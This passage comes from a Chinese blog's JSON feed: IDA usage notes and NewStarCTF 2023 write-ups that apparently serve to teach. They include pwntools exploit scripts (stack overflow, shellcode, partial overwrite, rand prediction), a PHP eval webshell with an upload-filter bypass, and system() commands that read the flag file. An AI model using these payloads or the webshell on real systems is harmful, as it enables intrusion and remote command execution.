            "content_html": "<h2 id=\"ida-使用\"><a class=\"markdownIt-Anchor\" href=\"#ida-使用\">#</a> IDA 使用</h2>\n<p>建议去看<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWVtNHkxUDdQTS8/c2hhcmVfc291cmNlPWNvcHlfd2ViJmFtcDt2ZF9zb3VyY2U9N2Q5NDgxMDFhMGVkNDczNzcyZTU4ZWVhMzdjNjFmOTQ=\">视频</span>，讲的很详细，很好。</p>\n<p>一般先找程序入口点，在  <code>Exports</code>  里面：</p>\n<p>![image-20231005103252765](IDA 使用 /image-20231005103252765.png)</p>\n<p>双击该内容  <code>start</code>  就可以直接定位到程序中的位置：</p>\n<p>![image-20231005103353127](IDA 使用 /image-20231005103353127.png)</p>\n<p>一般的，我们可以在  <code>option -&gt; general</code>  中将  <code>Stack Pointer</code>  和  <code>Auto comments</code>  打开，可以方便我们更好的查看源码的对应：</p>\n<p>![image-20231005103646708](IDA 使用 /image-20231005103646708.png)</p>\n<p>空格键可以切换视图效果：</p>\n<p>![image-20231005103807473](IDA 使用 /image-20231005103807473.png)</p>\n<p>切换过来后可以看到前面的地址以及段名称，如 <code>.text:00000000004010B0</code></p>\n<p>对着你想要反编译的内容 按  <code>F5</code> ，进行反编译：</p>\n<p>![image-20231005104011702](IDA 使用 /image-20231005104011702.png)</p>\n<p>可以在上面的页面中双击 main 进入到 main 函数中。</p>\n<p>右键  <code>Collapse declaration</code>  可以折叠变量，方便查看源码。</p>\n<p><code>N</code>  键可以用于重命名函数的变量名</p>\n<p><code>R</code>  键可以转换为字符模式显示</p>\n<p><code>H</code>  以数字或 16 进制显示</p>\n",
            "tags": [
                "知识"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "url": "http://yanagi-kon.github.io/2023/10/05/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20PWN/",
            "title": "NewStarCTF 2023 公开赛道 PWN",
            "date_published": "2023-10-05T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-pwn\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-pwn\">#</a> NewStarCTF 2023 公开赛道 PWN</h2>\n<h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<p><strong>考点：栈溢出，ret2txt</strong></p>\n<p>IDA 打开程序，找到主函数如下：</p>\n<p>![image-20231005150446089](NewStarCTF 2023 公开赛道 PWN/image-20231005150446089.png)</p>\n<p>发现是栈溢出类型的题目，在函数中也可以找到后门函数：</p>\n<p>![image-20231005150527611](NewStarCTF 2023 公开赛道 PWN/image-20231005150527611.png)</p>\n<p>利用 python 编写，直接填充字符覆盖返回地址为后门函数的地址即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25575</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token number\">0x4011FB</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#p64 (0) 是为了覆盖掉 ebp</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231005131606898](NewStarCTF 2023 公开赛道 PWN/image-20231005131606898.png)</p>\n<h3 id=\"ezshellcode\"><a class=\"markdownIt-Anchor\" href=\"#ezshellcode\">#</a> ezshellcode</h3>\n<p><strong>考点：shellcode</strong></p>\n<p>打开题目，在 IDA 中进行查看 main 函数：</p>\n<p>![image-20231007155118707](NewStarCTF 2023 公开赛道 PWN/image-20231007155118707.png)</p>\n<p>buf 被分配了 1000 字节的空间，起始地址为  <code>0x66660000</code></p>\n<p>最后一行  <code>JUMPOUT</code>  直接跳转到  <code>0x66660000</code>  地址并开始运行。题目会执行我们发送的字符，直接用 pwntools 库生成 shellcode 发送即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27833</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"magic\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sh<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231007155312386](NewStarCTF 2023 公开赛道 PWN/image-20231007155312386.png)</p>\n<p>得到 flag： <code>flag&#123;c67dd0d3-522f-49fd-8f7e-b073f471cd9c&#125;</code></p>\n<h3 id=\"newstar-shop\"><a class=\"markdownIt-Anchor\" href=\"#newstar-shop\">#</a> newstar shop</h3>\n<p><strong>考点：整数溢出</strong></p>\n<p>查看文件的安全保护，发现全开了，不过没关系，本题考查的是整数溢出。</p>\n<p>![image-20231007160826985](NewStarCTF 2023 公开赛道 PWN/image-20231007160826985.png)</p>\n<p>查看源码可以发现，在商店中购买物品会扣除钱，money 初始化为 64h，即 100 元，shop 中一共可以划掉 60：</p>\n<p>![image-20231007161011266](NewStarCTF 2023 公开赛道 PWN/image-20231007161011266.png)</p>\n<p>剩下的一个需要去 dont_try 中去花掉，点击会 - 50。在商店中购买时会检查你的钱够不够，不够是没办法购买的，所以最后使钱小于 0 这一步只能在第三个 dont_try 中花掉。</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28951</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#花掉 40</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#花掉 20</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#花掉 50</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 购买 shell</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>获取 flag 如下：</p>\n<p>![image-20231007162007829](NewStarCTF 2023 公开赛道 PWN/image-20231007162007829.png)</p>\n<p><code>flag&#123;cf39380f-910a-4125-a91b-21bf1b9f3eec&#125;</code></p>\n<h3 id=\"p1eee\"><a class=\"markdownIt-Anchor\" href=\"#p1eee\">#</a> p1eee</h3>\n<p><strong>考点：pie，partial overwrite</strong></p>\n<p>进入题目，打开 IDA ，找到后门函数：</p>\n<p>![image-20231007211944489](NewStarCTF 2023 公开赛道 PWN/image-20231007211944489.png)</p>\n<p>![image-20231007212111886](NewStarCTF 2023 公开赛道 PWN/image-20231007212111886.png)</p>\n<p>我们可以发现，溢出位置应该发生在 120E 函数中：</p>\n<p>![image-20231007212314466](NewStarCTF 2023 公开赛道 PWN/image-20231007212314466.png)</p>\n<p>我们再看 main 函数，可以发现其调用了 120E 函数，并且，最后 120E 函数的返回地址应该是 1297：</p>\n<p>![image-20231007213111787](NewStarCTF 2023 公开赛道 PWN/image-20231007213111787.png)</p>\n<p>和我们的后门函数的起始地址 1264 只差了 最后两个 16 进制数，也就是 1 字节的差距。虽然由于开了 PIE，基地址是不确定的，但是由于基地址最低 3 个 16 进制位为 0，所以低 3 位的偏移还是可以确定的。再看我们的 120E 函数，可以看到，buf 的空间范围是 0~-20，就是 20 个字节，再加上需要覆盖掉 ebp 的 8 字节，一共 28 字节，但是 read 读入了 29 字节，所以刚好多出一个字节供我们使用。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29292</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x6c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008135313847](NewStarCTF 2023 公开赛道 PWN/image-20231008135313847.png)</p>\n<p>得到 flag： <code>flag&#123;c9278352-5086-413f-99a8-034a7e2a1300&#125;</code></p>\n<h3 id=\"random\"><a class=\"markdownIt-Anchor\" href=\"#random\">#</a> Random</h3>\n<p><strong>考点</strong>：<strong>ctypes，pwntools</strong></p>\n<p>打开题目查看安全信息：全开了…</p>\n<p>![image-20231008135534154](NewStarCTF 2023 公开赛道 PWN/image-20231008135534154.png)</p>\n<p>这一题看大佬的说法是：利用 ctypes 库在 python 代码中调用 c 语言函数，可以与程序生成同样的伪随机数。</p>\n<pre><code>由于远程那边启动和本地加载libc有一定时间差，我在远程连接后本地获取的time0返回值减了1，然后就rand（）获取随机数发送就行了。\n\n只能说还是有一定运气成分的，有时候不一定能随机到$0，我是大概试个两三次就可以了。\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dll <span class=\"token operator\">=</span> CDLL<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#io = process('./random')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29115</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>seed <span class=\"token operator\">=</span> dll<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dll<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'number?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>dll<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>![image-20231008142330615](NewStarCTF 2023 公开赛道 PWN/image-20231008142330615.png)</p>\n",
            "tags": [
                "BUUCTF"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "url": "http://yanagi-kon.github.io/2023/10/04/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEB/",
            "title": "NewStarCTF 2023 公开赛道 WEB题目",
            "date_published": "2023-10-04T09:06:00.000Z",
            "content_html": "<h2 id=\"newstarctf-2023-公开赛道-web\"><a class=\"markdownIt-Anchor\" href=\"#newstarctf-2023-公开赛道-web\">#</a> NewStarCTF 2023 公开赛道 WEB</h2>\n<h3 id=\"泄漏的秘密\"><a class=\"markdownIt-Anchor\" href=\"#泄漏的秘密\">#</a> 泄漏的秘密</h3>\n<p><strong>考点：敏感文件泄漏</strong></p>\n<p>通过盲猜 www.zip、index.php 等常用隐藏名称可以猜出。或者使用 dirsearch 进行搜索，可以查找到 www.zip 文件：</p>\n<p><img data-src=\"image-20231003102650464.png\" alt=\"image-20231003102650464\"></p>\n<p>进行访问下载解压即可获得两个文件，将两个文件中的字段拼接起来就是 flag： <code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p>\n<p><img data-src=\"image-20231003102104114.png\" alt=\"image-20231003102104114\"></p>\n<h3 id=\"begin-of-upload\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-upload\">#</a> Begin of Upload</h3>\n<p><strong>考点：php 文件上传漏洞</strong>，<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjk1Nw==\">一句话木马介绍</span></p>\n<p>编写含有一句话木马的文件命名为 1.php，内容为：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"it is ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>点击上传后会提示：</p>\n<p><img data-src=\"image-20231003103302992.png\" alt=\"image-20231003103302992\"></p>\n<p>改传 1.php.png，随后通过 Burp 拦截将上传内容修改为 1.php，上传成功：</p>\n<p><img data-src=\"image-20231003110326234.png\" alt=\"image-20231003110326234\"></p>\n<p>再利用 中国蚁剑 工具进行链接：</p>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http<span class=\"token operator\">:</span><span class=\"token comment\">//eade7cdc-4610-4431-8fad-84e6f86ba897.node4.buuoj.cn:81/upload/1.php</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003110436400.png\" alt=\"image-20231003110436400\"></p>\n<p>直接在蚁剑中找到 flag 文件 fllll4g：</p>\n<p><img data-src=\"image-20231003112917654.png\" alt=\"image-20231003112917654\"></p>\n<p>或者 使用 Hackbar，查看目录内容也可以得知含有 fllll4g 文件：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"image-20231003113042254.png\" alt=\"image-20231003113042254\"></p>\n<p>再利用以下代码，得到 flag</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'cat /fllll4g'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"begin-of-http\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-http\">#</a> Begin of HTTP</h3>\n<p><strong>考点：HTTP 常见请求头、HTTP 请求方式</strong></p>\n<p>进入题目后，首先要求以 GET 方式给 ctf 参数传参数：</p>\n<p><img data-src=\"image-20231004093250416.png\" alt=\"image-20231004093250416\"></p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//node4.buuoj.cn:29762/?ctf=1</span></span></pre></td></tr></table></figure><p>之后要求用 POST 方法传入 secret 参数，并且必须是正确的 secret：</p>\n<p><img data-src=\"image-20231004094638065.png\" alt=\"image-20231004094638065\"></p>\n<p>打开网页源代码可以找到 secret 提示：</p>\n<p><img data-src=\"image-20231004094715815.png\" alt=\"image-20231004094715815\"></p>\n<p>Base64 解码后得到 secret 参数：</p>\n<pre><code>n3wst4rCTF2023g00000d\n</code></pre>\n<p>利用 Hackbar 传入 POST 参数：</p>\n<p><img data-src=\"image-20231004094931704.png\" alt=\"image-20231004094931704\"></p>\n<p>下面更改 power 参数为 ctfer：</p>\n<p><img data-src=\"image-20231004095011586.png\" alt=\"image-20231004095011586\"></p>\n<p>再更改浏览器参数为 NewStarCTF2023：</p>\n<p><img data-src=\"image-20231004095107075.png\" alt=\"image-20231004095107075\"></p>\n<p>之后加入 Refer 参数，并修改为 <span class=\"exturl\" data-url=\"aHR0cDovL25ld3N0YXJjdGYuY29t\">newstarctf.com</span>：</p>\n<p><img data-src=\"image-20231004095225805.png\" alt=\"image-20231004095225805\"></p>\n<p>加入 X-Real-IP 参数为 127.0.0.1，修改为本地用户访问：</p>\n<p><img data-src=\"image-20231004095445708.png\" alt=\"image-20231004095445708\"></p>\n<p>得到最终的 flag 值： <code>flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</code></p>\n<p><strong>另：</strong></p>\n<p>本题还可以使用 Burp 等工具进行修改参数，还可以使用 Python 进行求解：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> requests <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> b64decode</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://node4.buuoj.cn:29762/'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>params <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">'ctf'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'secret'</span><span class=\"token punctuation\">:</span> b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">'bjN3c3Q0ckNURjIwMjNnMDAwMDBk'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>cookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">'power'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'ctfer'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'NewStarCTF2023'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token string\">'Referer'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'newstarctf.com'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'X-Real-IP'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'localhost'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s <span class=\"token operator\">=</span> Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get_dict<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>输出为：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Begin of HTTP<span class=\"token tag\"><span class=\"token tag\"><span class=\"token 